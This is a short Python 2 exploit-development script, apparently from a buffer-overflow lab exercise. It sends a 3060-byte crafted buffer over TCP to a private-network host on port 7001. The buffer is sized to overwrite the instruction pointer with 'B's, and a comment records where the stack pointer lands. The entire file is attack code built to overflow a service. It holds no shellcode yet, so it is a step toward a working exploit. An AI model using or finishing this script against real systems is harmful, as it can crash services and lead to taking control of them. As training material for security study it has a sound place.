#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler    = "A" * 2288
  eip       = "B" * 4
  offset    = "C" * 8   # ESP lands at 03DEEE6C
  buffer    = "D" * (3060 - len(filler) - len(eip) - len(offset))

  inputBuffer = filler + eip + offset + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(inputBuffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"

